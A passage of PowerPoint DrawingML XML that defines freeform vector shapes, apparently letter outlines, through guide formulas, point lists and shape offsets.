                  <a:gd name="T77" fmla="*/ 103 h 151"/>
                  <a:gd name="T78" fmla="*/ 96 w 166"/>
                  <a:gd name="T79" fmla="*/ 93 h 151"/>
                  <a:gd name="T80" fmla="*/ 97 w 166"/>
                  <a:gd name="T81" fmla="*/ 91 h 151"/>
                  <a:gd name="T82" fmla="*/ 78 w 166"/>
                  <a:gd name="T83" fmla="*/ 43 h 151"/>
                  <a:gd name="T84" fmla="*/ 78 w 166"/>
                  <a:gd name="T85" fmla="*/ 40 h 151"/>
                  <a:gd name="T86" fmla="*/ 76 w 166"/>
                  <a:gd name="T87" fmla="*/ 41 h 151"/>
                  <a:gd name="T88" fmla="*/ 57 w 166"/>
                  <a:gd name="T89" fmla="*/ 91 h 151"/>
                  <a:gd name="T90" fmla="*/ 57 w 166"/>
                  <a:gd name="T91" fmla="*/ 91 h 151"/>
                  <a:gd name="T92" fmla="*/ 96 w 166"/>
                  <a:gd name="T93" fmla="*/ 93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66" h="151">
                    <a:moveTo>
                      <a:pt x="54" y="103"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="54" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="105"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="41" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="41" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="130"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="79" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="149" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="163" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="163" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="158" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="158" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="113" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="113" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="114" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="105"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="105"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="103"/>
                    </a:lnTo>
                    <a:close/>
                    <a:moveTo>
                      <a:pt x="96" y="93"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="96" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="97" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="93"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="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21" name="Freeform 144">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{123BE36E-6B41-46E0-B644-BC467BDC0D87}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5276690" y="2162736"/>
                <a:ext cx="117677" cy="127125"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 26 w 137"/>
                  <a:gd name="T1" fmla="*/ 15 h 148"/>
                  <a:gd name="T2" fmla="*/ 20 w 137"/>
                  <a:gd name="T3" fmla="*/ 16 h 148"/>
                  <a:gd name="T4" fmla="*/ 11 w 137"/>
                  <a:gd name="T5" fmla="*/ 19 h 148"/>
                  <a:gd name="T6" fmla="*/ 8 w 137"/>
                  <a:gd name="T7" fmla="*/ 21 h 148"/>
                  <a:gd name="T8" fmla="*/ 4 w 137"/>
                  <a:gd name="T9" fmla="*/ 28 h 148"/>
                  <a:gd name="T10" fmla="*/ 4 w 137"/>
                  <a:gd name="T11" fmla="*/ 29 h 148"/>
                  <a:gd name="T12" fmla="*/ 1 w 137"/>
                  <a:gd name="T13" fmla="*/ 30 h 148"/>
                  <a:gd name="T14" fmla="*/ 0 w 137"/>
                  <a:gd name="T15" fmla="*/ 26 h 148"/>
                  <a:gd name="T16" fmla="*/ 3 w 137"/>
                  <a:gd name="T17" fmla="*/ 15 h 148"/>
                  <a:gd name="T18" fmla="*/ 4 w 137"/>
                  <a:gd name="T19" fmla="*/ 4 h 148"/>
                  <a:gd name="T20" fmla="*/ 7 w 137"/>
                  <a:gd name="T21" fmla="*/ 0 h 148"/>
                  <a:gd name="T22" fmla="*/ 9 w 137"/>
                  <a:gd name="T23" fmla="*/ 0 h 148"/>
                  <a:gd name="T24" fmla="*/ 16 w 137"/>
                  <a:gd name="T25" fmla="*/ 3 h 148"/>
                  <a:gd name="T26" fmla="*/ 116 w 137"/>
                  <a:gd name="T27" fmla="*/ 3 h 148"/>
                  <a:gd name="T28" fmla="*/ 129 w 137"/>
                  <a:gd name="T29" fmla="*/ 3 h 148"/>
                  <a:gd name="T30" fmla="*/ 136 w 137"/>
                  <a:gd name="T31" fmla="*/ 1 h 148"/>
                  <a:gd name="T32" fmla="*/ 137 w 137"/>
                  <a:gd name="T33" fmla="*/ 3 h 148"/>
                  <a:gd name="T34" fmla="*/ 137 w 137"/>
                  <a:gd name="T35" fmla="*/ 5 h 148"/>
                  <a:gd name="T36" fmla="*/ 136 w 137"/>
                  <a:gd name="T37" fmla="*/ 29 h 148"/>
                  <a:gd name="T38" fmla="*/ 134 w 137"/>
                  <a:gd name="T39" fmla="*/ 32 h 148"/>
                  <a:gd name="T40" fmla="*/ 133 w 137"/>
                  <a:gd name="T41" fmla="*/ 30 h 148"/>
                  <a:gd name="T42" fmla="*/ 132 w 137"/>
                  <a:gd name="T43" fmla="*/ 26 h 148"/>
                  <a:gd name="T44" fmla="*/ 131 w 137"/>
                  <a:gd name="T45" fmla="*/ 23 h 148"/>
                  <a:gd name="T46" fmla="*/ 120 w 137"/>
                  <a:gd name="T47" fmla="*/ 16 h 148"/>
                  <a:gd name="T48" fmla="*/ 83 w 137"/>
                  <a:gd name="T49" fmla="*/ 15 h 148"/>
                  <a:gd name="T50" fmla="*/ 83 w 137"/>
                  <a:gd name="T51" fmla="*/ 92 h 148"/>
                  <a:gd name="T52" fmla="*/ 84 w 137"/>
                  <a:gd name="T53" fmla="*/ 133 h 148"/>
                  <a:gd name="T54" fmla="*/ 86 w 137"/>
                  <a:gd name="T55" fmla="*/ 137 h 148"/>
                  <a:gd name="T56" fmla="*/ 88 w 137"/>
                  <a:gd name="T57" fmla="*/ 142 h 148"/>
                  <a:gd name="T58" fmla="*/ 92 w 137"/>
                  <a:gd name="T59" fmla="*/ 144 h 148"/>
                  <a:gd name="T60" fmla="*/ 103 w 137"/>
                  <a:gd name="T61" fmla="*/ 144 h 148"/>
                  <a:gd name="T62" fmla="*/ 106 w 137"/>
                  <a:gd name="T63" fmla="*/ 146 h 148"/>
                  <a:gd name="T64" fmla="*/ 104 w 137"/>
                  <a:gd name="T65" fmla="*/ 148 h 148"/>
                  <a:gd name="T66" fmla="*/ 102 w 137"/>
                  <a:gd name="T67" fmla="*/ 148 h 148"/>
                  <a:gd name="T68" fmla="*/ 70 w 137"/>
                  <a:gd name="T69" fmla="*/ 148 h 148"/>
                  <a:gd name="T70" fmla="*/ 44 w 137"/>
                  <a:gd name="T71" fmla="*/ 148 h 148"/>
                  <a:gd name="T72" fmla="*/ 40 w 137"/>
                  <a:gd name="T73" fmla="*/ 146 h 148"/>
                  <a:gd name="T74" fmla="*/ 40 w 137"/>
                  <a:gd name="T75" fmla="*/ 145 h 148"/>
                  <a:gd name="T76" fmla="*/ 42 w 137"/>
                  <a:gd name="T77" fmla="*/ 144 h 148"/>
                  <a:gd name="T78" fmla="*/ 50 w 137"/>
                  <a:gd name="T79" fmla="*/ 144 h 148"/>
                  <a:gd name="T80" fmla="*/ 54 w 137"/>
                  <a:gd name="T81" fmla="*/ 140 h 148"/>
                  <a:gd name="T82" fmla="*/ 55 w 137"/>
                  <a:gd name="T83" fmla="*/ 133 h 148"/>
                  <a:gd name="T84" fmla="*/ 57 w 137"/>
                  <a:gd name="T85" fmla="*/ 92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37" h="148">
                    <a:moveTo>
                      <a:pt x="57" y="15"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="26" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="8" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="29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3" y="15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5" y="0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9" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="127" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="92" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="41" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57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22" name="Freeform 145">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E516404B-161E-409C-B8A5-35F2CDEB52F2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5396944" y="2165312"/>
                <a:ext cx="57550" cy="124548"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 18 w 67"/>
                  <a:gd name="T1" fmla="*/ 55 h 145"/>
                  <a:gd name="T2" fmla="*/ 17 w 67"/>
                  <a:gd name="T3" fmla="*/ 14 h 145"/>
                  <a:gd name="T4" fmla="*/ 16 w 67"/>
                  <a:gd name="T5" fmla="*/ 8 h 145"/>
                  <a:gd name="T6" fmla="*/ 10 w 67"/>
                  <a:gd name="T7" fmla="*/ 4 h 145"/>
                  <a:gd name="T8" fmla="*/ 4 w 67"/>
                  <a:gd name="T9" fmla="*/ 4 h 145"/>
                  <a:gd name="T10" fmla="*/ 1 w 67"/>
                  <a:gd name="T11" fmla="*/ 2 h 145"/>
                  <a:gd name="T12" fmla="*/ 0 w 67"/>
                  <a:gd name="T13" fmla="*/ 1 h 145"/>
                  <a:gd name="T14" fmla="*/ 5 w 67"/>
                  <a:gd name="T15" fmla="*/ 0 h 145"/>
                  <a:gd name="T16" fmla="*/ 31 w 67"/>
                  <a:gd name="T17" fmla="*/ 0 h 145"/>
                  <a:gd name="T18" fmla="*/ 58 w 67"/>
                  <a:gd name="T19" fmla="*/ 0 h 145"/>
                  <a:gd name="T20" fmla="*/ 60 w 67"/>
                  <a:gd name="T21" fmla="*/ 0 h 145"/>
                  <a:gd name="T22" fmla="*/ 62 w 67"/>
                  <a:gd name="T23" fmla="*/ 1 h 145"/>
                  <a:gd name="T24" fmla="*/ 58 w 67"/>
                  <a:gd name="T25" fmla="*/ 4 h 145"/>
                  <a:gd name="T26" fmla="*/ 52 w 67"/>
                  <a:gd name="T27" fmla="*/ 4 h 145"/>
                  <a:gd name="T28" fmla="*/ 48 w 67"/>
                  <a:gd name="T29" fmla="*/ 5 h 145"/>
                  <a:gd name="T30" fmla="*/ 46 w 67"/>
                  <a:gd name="T31" fmla="*/ 10 h 145"/>
                  <a:gd name="T32" fmla="*/ 45 w 67"/>
                  <a:gd name="T33" fmla="*/ 14 h 145"/>
                  <a:gd name="T34" fmla="*/ 45 w 67"/>
                  <a:gd name="T35" fmla="*/ 89 h 145"/>
                  <a:gd name="T36" fmla="*/ 45 w 67"/>
                  <a:gd name="T37" fmla="*/ 114 h 145"/>
                  <a:gd name="T38" fmla="*/ 46 w 67"/>
                  <a:gd name="T39" fmla="*/ 131 h 145"/>
                  <a:gd name="T40" fmla="*/ 47 w 67"/>
                  <a:gd name="T41" fmla="*/ 138 h 145"/>
                  <a:gd name="T42" fmla="*/ 54 w 67"/>
                  <a:gd name="T43" fmla="*/ 141 h 145"/>
                  <a:gd name="T44" fmla="*/ 63 w 67"/>
                  <a:gd name="T45" fmla="*/ 141 h 145"/>
                  <a:gd name="T46" fmla="*/ 66 w 67"/>
                  <a:gd name="T47" fmla="*/ 142 h 145"/>
                  <a:gd name="T48" fmla="*/ 67 w 67"/>
                  <a:gd name="T49" fmla="*/ 143 h 145"/>
                  <a:gd name="T50" fmla="*/ 63 w 67"/>
                  <a:gd name="T51" fmla="*/ 145 h 145"/>
                  <a:gd name="T52" fmla="*/ 30 w 67"/>
                  <a:gd name="T53" fmla="*/ 145 h 145"/>
                  <a:gd name="T54" fmla="*/ 5 w 67"/>
                  <a:gd name="T55" fmla="*/ 145 h 145"/>
                  <a:gd name="T56" fmla="*/ 1 w 67"/>
                  <a:gd name="T57" fmla="*/ 145 h 145"/>
                  <a:gd name="T58" fmla="*/ 1 w 67"/>
                  <a:gd name="T59" fmla="*/ 143 h 145"/>
                  <a:gd name="T60" fmla="*/ 4 w 67"/>
                  <a:gd name="T61" fmla="*/ 141 h 145"/>
                  <a:gd name="T62" fmla="*/ 10 w 67"/>
                  <a:gd name="T63" fmla="*/ 141 h 145"/>
                  <a:gd name="T64" fmla="*/ 13 w 67"/>
                  <a:gd name="T65" fmla="*/ 139 h 145"/>
                  <a:gd name="T66" fmla="*/ 17 w 67"/>
                  <a:gd name="T67" fmla="*/ 131 h 145"/>
                  <a:gd name="T68" fmla="*/ 18 w 67"/>
                  <a:gd name="T69" fmla="*/ 114 h 145"/>
                  <a:gd name="T70" fmla="*/ 18 w 67"/>
                  <a:gd name="T71" fmla="*/ 55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7" h="145">
                    <a:moveTo>
                      <a:pt x="18" y="55"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="18" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="4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1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58" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="60" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="58" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="114"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="30" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="139"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="16" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="114"/>
                    </a:lnTo>
                    <a:lnTo>
